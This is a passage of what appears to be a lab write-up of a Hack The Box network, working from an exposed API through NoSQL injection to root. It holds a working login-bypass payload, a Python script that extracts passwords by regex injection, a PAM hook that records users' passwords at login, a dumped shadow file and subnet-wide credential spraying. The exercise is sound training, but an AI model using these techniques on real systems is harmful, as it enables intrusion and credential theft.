              "schema": {
                "$ref": "#/components/schemas/UserModelRegister"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "Create a new user",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/user/login": {
      "post": {
        "tags": [
          "user"
        ],
        "summary": "Login",
        "operationId": "login_user_login_post",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "title": "Payload",
                "type": "object"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "Login",
            "content": {
              "text/plain": {
                "schema": {
                  "type": "string"
                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    }
  },
  "components": {
    "schemas": {
      "HTTPValidationError": {
        "title": "HTTPValidationError",
        "type": "object",
        "properties": {
          "detail": {
            "title": "Detail",
            "type": "array",
            "items": {
              "$ref": "#/components/schemas/ValidationError"
            }
          }
        }
      },
      "PhoneModel": {
        "title": "PhoneModel",
        "required": [
          "name",
          "description",
          "extension"
        ],
        "type": "object",
        "properties": {
          "_id": {
            "title": " Id",
            "type": "string"
          },
          "name": {
            "title": "Name",
            "type": "string"
          },
          "description": {
            "title": "Description",
            "type": "string"
          },
          "extension": {
            "title": "Extension",
            "type": "integer"
          }
        },
        "example": {
          "id": "00010203-0405-0607-0809-0a0b0c0d0e0f",
          "name": "Eugene Belford",
          "description": "Evil Genius",
          "extension": 1234
        }
      },
      "UpdatePhoneModel": {
        "title": "UpdatePhoneModel",
        "type": "object",
        "properties": {
          "name": {
            "title": "Name",
            "type": "string"
          },
          "description": {
            "title": "Description",
            "type": "string"
          },
          "extension": {
            "title": "Extension",
            "type": "integer"
          }
        },
        "example": {
          "name": "Eugene Belford",
          "description": "Evil Genius",
          "extension": 1234
        }
      },
      "UserModelRegister": {
        "title": "UserModelRegister",
        "required": [
          "username",
          "password",
          "access_level"
        ],
        "type": "object",
        "properties": {
          "username": {
            "title": "Username",
            "type": "string"
          },
          "password": {
            "title": "Password",
            "type": "string"
          },
          "access_level": {
            "title": "Access Level",
            "type": "integer"
          }
        },
        "example": {
          "username": "user1",
          "password": "password1",
          "access_level": 0
        }
      },
      "ValidationError": {
        "title": "ValidationError",
        "required": [
          "loc",
          "msg",
          "type"
        ],
        "type": "object",
        "properties": {
          "loc": {
            "title": "Location",
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "msg": {
            "title": "Message",
            "type": "string"
          },
          "type": {
            "title": "Error Type",
            "type": "string"
          }
        }
      }
    }
  }
}
```

And a quick check seems like the /user/ endpoint should allow you to add a new user?  
<br/>

![e11d492a66aa0e056666ac6b24da7b88.png](../../../_resources/e11d492a66aa0e056666ac6b24da7b88.png)

# Back on Track

With the secret key obtained by PWNING the FTS01 machine I can now craft my own JWT token and upgrage from a low-privileged user to a bigger one:

```bash
katja@fts01:/opt/fts-api$ cat app/core/config.py
from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator
from typing import List, Optional, Union

import os
from enum import Enum


class Settings(BaseSettings):
    API_V1_STR: str = "/api/v1"
    JWT_SECRET: str = "ThisIsAnUncrackableJWTSecret...OrIsIt?"
    ALGORITHM: str = "HS256"

    # 60 minutes * 24 hours * 8 days = 8 days
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8

    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins
    # e.g: '["http://localhost", "http://localhost:4200", "http://localhost:3000", \
    # "http://localhost:8080", "http://local.dockertoolbox.tiangolo.com"]'
    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []

    @validator("BACKEND_CORS_ORIGINS", pre=True)
    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:
        if isinstance(v, str) and not v.startswith("["):
            return [i.strip() for i in v.split(",")]
        elif isinstance(v, (list, str)):
            return v
        raise ValueError(v)

    SQLALCHEMY_DATABASE_URI: Optional[str] = "sqlite:///fts.db"
    FIRST_SUPERUSER: EmailStr = "root@ippsec.rocks"    

    class Config:
        case_sensitive = True
 

settings = Settings()

```

![5c1327b8f3368b8ab9bcaa0795889d63.png](../../../_resources/5c1327b8f3368b8ab9bcaa0795889d63.png)

But seems like it is not true?

![9d233ee1bab96275ef55d7758050ff60.png](../../../_resources/9d233ee1bab96275ef55d7758050ff60.png)

# Third attempt

Now. from the data extracted from the Gitlab server I was able to understand that the API was using mongo as database that's why it was always failing:

```python
router.post("/login", response_description="Login", response_class=PlainTextResponse)
async def login(request: Request, payload: dict = Body(...)):
    if (user := await request.app.mongodb["users"].find_one({"username": payload["username"], "password": payload["password"]})) is not None:
        del[user["_id"]]
        token = jwt.encode({"username": user["username"], "access_level":user["access_level"]}, utils.SECRET_KEY, algorithm=utils.ALGORITHM)
        return token
    raise HTTPException(status_code=404, detail=f"Username or Password invalid")

```

Which means taking simple authentication bypass methods from the Payload all the Things like the following:

```http
POST /65923fad8eba57a06604c27a4fb46f70/user/login HTTP/1.1
Host: 10.10.110.25
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Type: application/json
Content-Length: 60

{"username": {"$ne": "guest"}, "password": {"$ne": "bar"}}

```

in this case I am expicitly telling the NOSQL to take something that is not equal to "guest" and which doesn't have a password equal to "bar" and i can see now I have a token as gizmo:

![b78937b6c705e404eebbe6b569a6639e.png](../../../_resources/b78937b6c705e404eebbe6b569a6639e.png)

Which means now I am able to list all the administrative endpoints from the site:

![9051e837cc2e5166d3f8cfb9078e1f9b.png](../../../_resources/9051e837cc2e5166d3f8cfb9078e1f9b.png)

# Another theory

Now here appured that we have a NOSQLi and managed to bypass the login authentication to an administrative user with role equal to two I was thinking if polluting the phone extesions will not be what I need to do? I mean the data is saved in a mongodb that is accessible only from the localhost so, that can't be readed by the Asterisk server att all.   
For this reason I suspect I need to abuse that inection on the login page in order to "guess"  the password of the other users in the system. I adapted an old python script I wrote for the CWEE labs so that I am able to export the password for all the 4 users in the system:

```python
import httplib2
import string
import json
import sys # Added for flushing the buffer

URL = "https://10.10.110.25/65923fad8eba57a06604c27a4fb46f70/user/login"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
user_list = ["guest", "gizmo", "izo", "wanderer"]

http = httplib2.Http(disable_ssl_certificate_validation=True)

for target_user in user_list:
    password = ""
    # Print the user header and move to a new line
    print(f"\n[*] Extracting password for: {target_user}")
    
    for i in range(37): 
        found_char = False
        for char in alphabet:
            # Show the character currently being tested (optional)
            sys.stdout.write(f"\r[+] Found so far: {password}{char}")
            sys.stdout.flush()

            payload = {
                "username": target_user,
                "password": {"$regex": "^" + password + char}
            }

            headers = {'Content-Type': 'application/json'}
            try:
                response_headers, content = http.request(
                    URL, method="POST", headers=headers, body=json.dumps(payload)
                )

                if response_headers.status == 200:
                    password += char
                    found_char = True
                    break
            except Exception:
                break
        
        if not found_char:
            # Final output for this user
            print(f"\r[*] Final Password for {target_user}: {password}".ljust(50))
            break

```

Now the script is not perfect and it could be improved(example by instructing to stop when finding the padding bytes **\$** at the end) but now I have a list of credentials:

```bash
─$ python nosqli_login.py 

[*] Extracting password for: guest
[+] Found so far: HTB{6b9c31208663e59464460f78e4b79aff}
[*] Extracting password for: gizmo
[+] Found so far: JunktownKing!$$$$$$$$$$$$$$$$$$$$$$$$
[*] Extracting password for: izo
[+] Found so far: NukaCola2077!$$$$$$$$$$$$$$$$$$$$$$$$
[*] Extracting password for: wanderer
[+] Found so far: SynthLivesMatter$$$$$$$$$$$$$$$$$$$$$     
```

And as you see 2 of the 3 uses can ssh into the machine:

![c0f75c93e61c64381f220ce529c3a6cd.png](../../../_resources/c0f75c93e61c64381f220ce529c3a6cd.png)

And from IZO's credentials I can grab another flag:

```bash
izo@mobile01:~$ ll
total 36
drwxr-x--- 5 izo  izo  4096 Apr 14 06:54 ./
drwxr-xr-x 8 root root 4096 Mar  8  2025 ../
drwxr--r-- 4 izo  izo  4096 Mar  2  2025 .Zoiper5/
lrwxrwxrwx 1 root root    9 Mar 19  2025 .bash_history -> /dev/null
-rw-r--r-- 1 izo  izo   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 izo  izo  3771 Jan  6  2022 .bashrc
drwx------ 2 izo  izo  4096 Apr 14 06:54 .cache/
lrwxrwxrwx 1 root root    9 Mar 19  2025 .mysql_history -> /dev/null
-rw-r--r-- 1 izo  izo   807 Jan  6  2022 .profile
drwx------ 2 izo  izo  4096 Mar  8  2025 .ssh/
-rw-r--r-- 1 root root   37 Mar  8  2025 flag.txt
izo@mobile01:~$ cat flag.txt 
HTB{762f4c7594e6ddec37c02c9e3d4496ea}izo@mobile01:~$ 

```

From the home folder I can see that there is a Zoip Softphone VOIP configurations that might help me move to the asterisk machine:

```bash
izo@mobile01:~/.Zoiper5$ ls -al
total 424
drwxr--r-- 4 izo izo   4096 Mar  2  2025 .
drwxr-x--- 5 izo izo   4096 Apr 14 06:54 ..
drwxr--r-- 2 izo izo   4096 Mar  2  2025 CertificateExceptions
-rwxr--r-- 1 izo izo  21543 Mar  2  2025 Config.bak
-rwxr--r-- 1 izo izo  21543 Mar  2  2025 Config.xml
-rwxr--r-- 1 izo izo 212992 Mar  2  2025 ContactsV2.db
drwxr--r-- 6 izo izo   4096 Mar  2  2025 Crashpad
-rwxr--r-- 1 izo izo 151552 Mar  2  2025 HistoryV2.db
-rwxr--r-- 1 izo izo    196 Mar  2  2025 logfile_cef.txt

```

# Road to Root

Now it is clearly time to check how can i become root in this machine. I will start by checking the MongoDB for databases:

```bash
zo@mobile01:/tmp$ mongosh
Current Mongosh Log ID:	69de378b145fba915c6b140a
Connecting to:		mongodb://127.0.0.1:27017/?directConnection=true&serverSelectionTimeoutMS=2000&appName=mongosh+2.4.2
Using MongoDB:		6.0.20
Using Mongosh:		2.4.2

For mongosh info see: https://www.mongodb.com/docs/mongodb-shell/


To help improve our products, anonymous usage data is collected and sent to MongoDB periodically (https://www.mongodb.com/legal/privacy-policy).
You can opt-out by running the disableTelemetry() command.

------
   The server generated these startup warnings when booting
   2026-04-14T02:14:08.719+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
   2026-04-14T02:14:09.342+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
   2026-04-14T02:14:09.342+00:00: vm.max_map_count is too low
------

test> show databases;
admin   100.00 KiB
config   60.00 KiB
local    72.00 KiB
mobile   80.00 KiB
test> 


```

Ok so nothing interesting so far:

```bash
mobile> db.phones.find()
[
  {
    _id: ObjectId('67ccb4f96d0a4374126b140b'),
    name: 'benny',
    extension: '1000',
    description: 'IT Admin',
    id: 'a64ee717-a0dd-4426-88e5-81b8a1b816c5'
  },
  {
    _id: ObjectId('67ccb4fda36b39ee366b140b'),
    name: 'gizmo',
    extension: '1001',
    description: 'Asterisk Admin',
    id: '9e0db500-d01c-4bff-90f8-84e0617b8a32'
  },
  {
    _id: ObjectId('67ccb5003f29fa2c5c6b140b'),
    name: 'izo',
    extension: '1002',
    description: 'Remote User',
    id: '20a01776-6277-4882-8070-2576f9121f52'
  },
  {
    _id: ObjectId('67ccb503e53f4c6d736b140b'),
    name: 'katja',
    extension: '1003',
    description: 'Web Admin',
    id: '8d43e941-be7c-4470-ad40-05b989feb3ee'
  },
  {
    _id: ObjectId('67ccb506a9eb16114b6b140b'),
    name: 'house',
    extension: '1337',
    description: 'CEO',
    id: '0705e117-9358-4432-952d-7d8e3bf90653'
  },
  {
    _id: ObjectId('67ccb5099987ac41356b140b'),
    name: 'Voicemail',
    extension: '6500',
    description: '',
    id: '88c97c87-8555-4f88-8cb1-11f8974d84c6'
  }
]
mobile> db.users.find()
[
  {
    _id: ObjectId('67ccb4edb7434753cb6b140b'),
    username: 'guest',
    password: 'HTB{6b9c31208663e59464460f78e4b79aff}',
    access_level: 0,
    id: '2cbda7db-35eb-4f0d-aeaa-1a55d79fa5a6'
  },
  {
    _id: ObjectId('67ccb4f0955050a45b6b140b'),
    username: 'gizmo',
    password: 'JunktownKing!',
    access_level: 2,
    id: 'fb9afda3-a4f4-4514-9e36-9e3b12de6adf'
  },
  {
    _id: ObjectId('67ccb4f3b6fe4624a66b140b'),
    username: 'wanderer',
    password: 'SynthLivesMatter',
    access_level: 2,
    id: '92e5f913-552d-4001-bd19-abd7c026b698'
  },
  {
    _id: ObjectId('67ccb4f63d22ae388d6b140b'),
    username: 'izo',
    password: 'NukaCola2077!',
    access_level: 2,
    id: '13168940-278d-4d4c-be24-a9b2dbdc56a9'
  }
]
mobile> 

```

Next I am now able to see that House user is indeed very interesting as it is sudo on this machine:

```bash
╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=1001(izo) gid=1001(izo) groups=1001(izo)
uid=1002(gizmo) gid=1002(gizmo) groups=1002(gizmo)
uid=1003(house) gid=27(sudo) groups=27(sudo)
uid=1004(ghoul) gid=1004(ghoul) groups=1004(ghoul)
uid=1005(preston) gid=1005(preston) groups=1005(preston)
uid=1006(deploy) gid=1006(deploy) groups=1006(deploy)
uid=101(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=102(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=103(messagebus) gid=104(messagebus) groups=104(messagebus)
uid=104(systemd-timesync) gid=105(systemd-timesync) groups=105(systemd-timesync)
uid=105(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=108(mongodb) gid=65534(nogroup) groups=65534(nogroup),112(mongodb)
uid=109(syslog) gid=113(syslog) groups=113(syslog),4(adm)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=999(laurel) gid=999(laurel) groups=999(laurel)

```

And this is the secret token used to craft the JWT token for the application:

```bash
izmo@mobile01:/opt/mobile-api/lib$ cat utils.py 
from fastapi import Depends, FastAPI, HTTPException, Header
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from jose import jwt, JWTError

security = HTTPBearer()
SECRET_KEY = "SuperUncrackableKeyWTFMate"
ALGORITHM = "HS256"

def verify_token(authorization: str = Header(...)):
    try:
        scheme, token = authorization.split()
        if scheme.lower() != "bearer":
            raise HTTPException(status_code=401, detail="Invalid authentication scheme.")
        # Verify and decode the JWT
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        access_level = payload.get("access_level")
        if access_level > -1:
            return access_level
        else:
            raise HTTPException(status_code=401, detail="Invalid token")
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")
```

It is clear I need to obtain House(CEO) in order to pwn this machine, for this reason I will move on to the Asterisk machine.

# End of the road

From here I will use the credentials obtained by listening the new messages on the Voicemail and I am now able to login and I have sudo rights as expected:

```bash
└─$ ssh house@10.10.110.25
house@10.10.110.25's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

house@mobile01:~$ sudo -l
Matching Defaults entries for house on mobile01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User house may run the following commands on mobile01:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
house@mobile01:~$ ls -al

```

And now I can grab another flag:

```bash
root@mobile01:~# cat flag.txt 
HTB{58118f363fe13a596fdcaaa03cdd3fdc}root@mobile01:~# 

```

Now before moving forward I need to obtian the credentials of Ghoul user that does another cron login from the .22 machine:

```bash
root@mobile01:/tmp# cat toomanysecrets.sh 
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /tmp/toomanysecrets.log
root@mobile01:/tmp# ll
total 52
drwxrwxrwt 12 root    root    4096 Apr 15 08:32 ./
drwxr-xr-x 18 root    root    4096 Mar 17  2025 ../
drwxrwxrwt  2 root    root    4096 Apr 15 02:13 .ICE-unix/
drwxrwxrwt  2 root    root    4096 Apr 15 02:13 .Test-unix/
drwxrwxrwt  2 root    root    4096 Apr 15 02:13 .X11-unix/
drwxrwxrwt  2 root    root    4096 Apr 15 02:13 .XIM-unix/
drwxrwxrwt  2 root    root    4096 Apr 15 02:13 .font-unix/
srwx------  1 mongodb mongodb    0 Apr 15 02:14 mongodb-27017.sock=
drwx------  3 root    root    4096 Apr 15 02:14 systemd-private-ace6ad3332e24205b552c8b357b15d18-mobile-api.service-z9uAv6/
drwx------  3 root    root    4096 Apr 15 02:14 systemd-private-ace6ad3332e24205b552c8b357b15d18-systemd-logind.service-gPf4GY/
drwx------  3 root    root    4096 Apr 15 02:13 systemd-private-ace6ad3332e24205b552c8b357b15d18-systemd-resolved.service-XWSGL0/
drwx------  3 root    root    4096 Apr 15 02:13 systemd-private-ace6ad3332e24205b552c8b357b15d18-systemd-timesyncd.service-shaiPR/
-rwxr-xr-x  1 root    root      91 Apr 15 08:32 toomanysecrets.sh*
drwx------  2 root    root    4096 Apr 15 02:13 vmware-root_725-4282367508/
root@mobile01:/tmp# 


```

Now it is time to inject the custom script in the pam file:

```bash
cat /etc/pam.d/common-auth
#
# /etc/pam.d/common-auth - authentication settings common to all services
#
# This file is included from other service-specific PAM config files,
# and should contain a list of the authentication modules that define
# the central authentication scheme for use on the system
# (e.g., /etc/shadow, LDAP, Kerberos, etc.).  The default is to use the
# traditional Unix authentication mechanisms.
#
# As of pam 1.0.1-6, this file is managed by pam-auth-update by default.
# To take advantage of this, it is recommended that you configure any
# local modules either before or after the default block, and use
# pam-auth-update to manage selection of other modules.  See
# pam-auth-update(8) for details.

# here are the per-package modules (the "Primary" block)
auth	[success=1 default=ignore]	pam_unix.so nullok
# here's the fallback if no module succeeds
auth	requisite			pam_deny.so
# prime the stack with a positive return value if there isn't one already;
# this avoids us returning an error just because nothing sets a success code
# since the modules above will each just jump around
auth	required			pam_permit.so
# and here are more per-package modules (the "Additional" block)
auth	optional			pam_cap.so 
# end of pam-auth-update config
auth optional pam_exec.so quiet expose_authtok /tmp/toomanysecrets.sh

```

And I have the creds:

```bash
root@mobile01:/tmp# cat toomanysecrets.log 
 Wed Apr 15 08:36:16 UTC 2026 ghoul, Vaultboy4Prez!, From: 172.16.0.22
root@mobile01:/tmp# 


```

And these new users has no more access than what I already have:

```bash
netexec ssh 172.16.0.0/24 -u house -p Lucky38
SSH         172.16.0.3      22     172.16.0.3       [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.11
SSH         172.16.0.22     22     172.16.0.22      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.11
SSH         172.16.0.6      22     172.16.0.6       [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.11
SSH         172.16.0.100    22     172.16.0.100     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.11
SSH         172.16.0.254    22     172.16.0.254     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.11
SSH         172.16.0.3      22     172.16.0.3       [+] house:Lucky38 (Pwn3d!) Linux - Shell access!
SSH         172.16.0.22     22     172.16.0.22      [-] house:Lucky38
SSH         172.16.0.6      22     172.16.0.6       [-] house:Lucky38
SSH         172.16.0.100    22     172.16.0.100     [-] house:Lucky38
SSH         172.16.0.254    22     172.16.0.254     [-] house:Lucky38
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
                                                                                                                                                               
┌──(user㉿kali-almi)-[~/Downloads/Wanderer]
└─$ netexec ssh 172.16.0.0/24 -u ghoul -p 'Vaultboy4Prez!'
SSH         172.16.0.6      22     172.16.0.6       [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.11
SSH         172.16.0.22     22     172.16.0.22      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.11
SSH         172.16.0.3      22     172.16.0.3       [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.11
SSH         172.16.0.254    22     172.16.0.254     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.11
SSH         172.16.0.100    22     172.16.0.100     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.11
SSH         172.16.0.6      22     172.16.0.6       [-] ghoul:Vaultboy4Prez!
SSH         172.16.0.22     22     172.16.0.22      [-] ghoul:Vaultboy4Prez!
SSH         172.16.0.3      22     172.16.0.3       [+] ghoul:Vaultboy4Prez!  Linux - Shell access!
SSH         172.16.0.254    22     172.16.0.254     [-] ghoul:Vaultboy4Prez!
SSH         172.16.0.100    22     172.16.0.100     [-] ghoul:Vaultboy4Prez!
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

Now apparently I got a nudge to try to check for more credentials and I wonder if the preston(that's the only user I have not found out so far) has a lower hash?

```bash
Can I read shadow files? ............. root:$6$rounds=656000$jEt.brBL9mRyLQe7$Gqh4F09nimuD5Pnf5mHp9LGczpiTeI27K48j682y8wo3qqIgJiR1JK0WV6.FqRcuODJwtpPiolAiLUv4q9WHh0:20155:0:99999:7:::
daemon:*:19103:0:99999:7:::
bin:*:19103:0:99999:7:::
sys:*:19103:0:99999:7:::
sync:*:19103:0:99999:7:::
games:*:19103:0:99999:7:::
man:*:19103:0:99999:7:::
lp:*:19103:0:99999:7:::
mail:*:19103:0:99999:7:::
news:*:19103:0:99999:7:::
uucp:*:19103:0:99999:7:::
proxy:*:19103:0:99999:7:::
www-data:*:19103:0:99999:7:::
backup:*:19103:0:99999:7:::
list:*:19103:0:99999:7:::
irc:*:19103:0:99999:7:::
gnats:*:19103:0:99999:7:::
nobody:*:19103:0:99999:7:::
_apt:*:19103:0:99999:7:::
systemd-network:*:19103:0:99999:7:::
systemd-resolve:*:19103:0:99999:7:::
messagebus:*:19103:0:99999:7:::
systemd-timesync:*:19103:0:99999:7:::
pollinate:*:19103:0:99999:7:::
sshd:*:19103:0:99999:7:::
usbmux:*:19548:0:99999:7:::
mongodb:*:20155:0:99999:7:::
izo:$6$rounds=656000$aZosOTGeBRHY642x$eBeALU4vu38Cec13QUpPCRax1ENeGnu3svwx6Ahyuu9z57opKDIry4HLmmPlWubYlPKyATUGUlysDs1.Qwyzc.:20155:0:99999:7:::
gizmo:$6$rounds=656000$GjaeqYz2cF5VOlOB$PkgPB9WRfObmZmIaHJwoh2sssuBPPhl2BDnjn0G78hsj3wgYGTam7uxncXu/uSEE2DFJ0/ZvcW6JtlRHUaQzm/:20155:0:99999:7:::
house:$6$rounds=656000$Cm/gbqCWE8UTgD2n$ttf3KarW3qsry9U/0MSSMEQjtYtROoqCJDelfeIIW39zWDhhbcFLQjM/7vRtNKBwWZ1gpIi/esrGI70A4cjZ71:20155:0:99999:7:::
ghoul:$6$rounds=656000$XHkSZXOOyEwBrERT$iTR96LoZgQZSbpQnX7.lz1rpEKLLiubdO9YzsWW6Y1xX0BV7Xjh7QqPc3y6LYf1cIohFDUq96mym3a9Xhgpok.:20155:0:99999:7:::
preston:$2y$10$yTpVM1elOws0X1Vq/ei8HO2tp7Eeo93qgTnthNGm7WZdQjlr3ahcm:20155:0:99999:7:::
deploy:$6$rounds=656000$lSYiApaXL95gy7N.$eTKTeMawevc9qsJlYx05uft81A9hjlFtLfAUsihnebVAl7tmgbjPiwu0ZspDGsSW.7lkDPaHK7Mo2Lh7gS7Qw0:20155:0:99999:7:::
syslog:*:20155:0:99999:7:::
laurel:!:20155::::::
root:$6$rounds=656000$jEt.brBL9mRyLQe7$Gqh4F09nimuD5Pnf5mHp9LGczpiTeI27K48j682y8wo3qqIgJiR1JK0WV6.FqRcuODJwtpPiolAiLUv4q9WHh0:20155:0:99999:7:::
daemon:*:19103:0:99999:7:::
bin:*:19103:0:99999:7:::
sys:*:19103:0:99999:7:::
sync:*:19103:0:99999:7:::
games:*:19103:0:99999:7:::
man:*:19103:0:99999:7:::
lp:*:19103:0:99999:7:::
mail:*:19103:0:99999:7:::
news:*:19103:0:99999:7:::
uucp:*:19103:0:99999:7:::
proxy:*:19103:0:99999:7:::
www-data:*:19103:0:99999:7:::
backup:*:19103:0:99999:7:::
list:*:19103:0:99999:7:::
irc:*:19103:0:99999:7:::
gnats:*:19103:0:99999:7:::
nobody:*:19103:0:99999:7:::
_apt:*:19103:0:99999:7:::
systemd-network:*:19103:0:99999:7:::
systemd-resolve:*:19103:0:99999:7:::
messagebus:*:19103:0:99999:7:::
systemd-timesync:*:19103:0:99999:7:::
pollinate:*:19103:0:99999:7:::
sshd:*:19103:0:99999:7:::
usbmux:*:19548:0:99999:7:::
mongodb:*:20155:0:99999:7:::
izo:$6$rounds=656000$aZosOTGeBRHY642x$eBeALU4vu38Cec13QUpPCRax1ENeGnu3svwx6Ahyuu9z57opKDIry4HLmmPlWubYlPKyATUGUlysDs1.Qwyzc.:20155:0:99999:7:::
gizmo:$6$rounds=656000$GjaeqYz2cF5VOlOB$PkgPB9WRfObmZmIaHJwoh2sssuBPPhl2BDnjn0G78hsj3wgYGTam7uxncXu/uSEE2DFJ0/ZvcW6JtlRHUaQzm/:20155:0:99999:7:::
house:$6$rounds=656000$Cm/gbqCWE8UTgD2n$ttf3KarW3qsry9U/0MSSMEQjtYtROoqCJDelfeIIW39zWDhhbcFLQjM/7vRtNKBwWZ1gpIi/esrGI70A4cjZ71:20155:0:99999:7:::
ghoul:$6$rounds=656000$XHkSZXOOyEwBrERT$iTR96LoZgQZSbpQnX7.lz1rpEKLLiubdO9YzsWW6Y1xX0BV7Xjh7QqPc3y6LYf1cIohFDUq96mym3a9Xhgpok.:20155:0:99999:7:::
preston:$2y$10$yTpVM1elOws0X1Vq/ei8HO2tp7Eeo93qgTnthNGm7WZdQjlr3ahcm:20155:0:99999:7:::
deploy:$6$rounds=656000$lSYiApaXL95gy7N.$eTKTeMawevc9qsJlYx05uft81A9hjlFtLfAUsihnebVAl7tmgbjPiwu0ZspDGsSW.7lkDPaHK7Mo2Lh7gS7Qw0:20155:0:99999:7:::
syslog:*:20155:0:99999:7:::
root:*::
daemon:*::

```

# Post Exploitation

Now I had to ask for a nudge but apparently something I missed here is that Ghoul seems performing some kind of logging:

```bash
2026/04/15 10:03:02 CMD: UID=0     PID=1      | /sbin/init 
2026/04/15 10:03:15 CMD: UID=0     PID=40801  | /usr/sbin/sshd -D -R 
2026/04/15 10:03:15 CMD: UID=106   PID=40802  | sshd: [net]          
2026/04/15 10:03:15 CMD: UID=0     PID=40803  | 
2026/04/15 10:03:15 CMD: UID=0     PID=40804  | (systemd) 
2026/04/15 10:03:15 CMD: UID=1004  PID=40805  | (sd-pam) 
2026/04/15 10:03:15 CMD: UID=1004  PID=40806  | (sd-executor)               
2026/04/15 10:03:15 CMD: UID=1004  PID=40807  | 
2026/04/15 10:03:15 CMD: UID=1004  PID=40808  | (sd-executor)               
2026/04/15 10:03:15 CMD: UID=1004  PID=40809  | (direxec)                   
2026/04/15 10:03:16 CMD: UID=0     PID=40810  | 
2026/04/15 10:03:16 CMD: UID=1004  PID=40811  | /lib/systemd/systemd --user 
2026/04/15 10:03:16 CMD: UID=0     PID=40812  | sshd: ghoul [priv]   
2026/04/15 10:03:16 CMD: UID=0     PID=40813  | /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d 
2026/04/15 10:03:16 CMD: UID=0     PID=40814  | 
2026/04/15 10:03:16 CMD: UID=0     PID=40816  | uname -r 
